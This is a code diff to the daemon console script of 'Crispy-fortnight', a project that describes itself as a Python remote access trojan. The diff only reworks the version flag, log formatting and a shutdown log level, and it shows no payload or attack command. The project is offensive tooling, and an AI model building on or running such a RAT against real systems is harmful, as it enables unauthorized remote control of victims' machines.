@@ -5,6 +5,7 @@ import ConfigParser
 from crispy.network.server_handler import CrispyTCPServerHandler
 from crispy.lib.server import CrispyTCPServer
 from crispy.lib.cli import CrispyCLI
+from crispy import __version__
     
 def main():
     argp = argparse.ArgumentParser(description="Crispy-fortnight (Python RAT) daemon console.",
@@ -22,13 +23,10 @@ def main():
 			dest="loglevel",
 			help="Change log verbosity",
 			type=str)
-    argp.add_argument("--version", 
-                        action="store_true", 
-                        help="Print version and exit")
+    argp.add_argument('--version',
+			action='version', 
+			version='%(prog)s {}'.format(__version__))
     args = argp.parse_args()
-
-    if args.version: 
-	print "{}".format(__version__)
 
     if args.loglevel == "DEBUG":
 	loglevel = logging.DEBUG
@@ -41,7 +39,7 @@ def main():
     
     logging.basicConfig(datefmt='%m/%d/%Y %I:%M:%S %p',
 			filename='crispy.log',
-			format='%(asctime)-15s - %(levelname)-5s - %(module)-3s - %(message)s',
+			format='%(asctime)-15s - %(levelname)-7s - %(module)-10s - %(message)s',
 			level=loglevel)
 
     config = ConfigParser.ConfigParser()
@@ -56,7 +54,7 @@ def main():
     try:
 	CrispyCLI(srv).cmdloop()
     except KeyboardInterrupt:
-	logging.info("Ctrl-C received... shutting down crispyd")
+	logging.warning("Ctrl-C received... shutting down crispyd")
 
 if __name__ == "__main__":
     main()
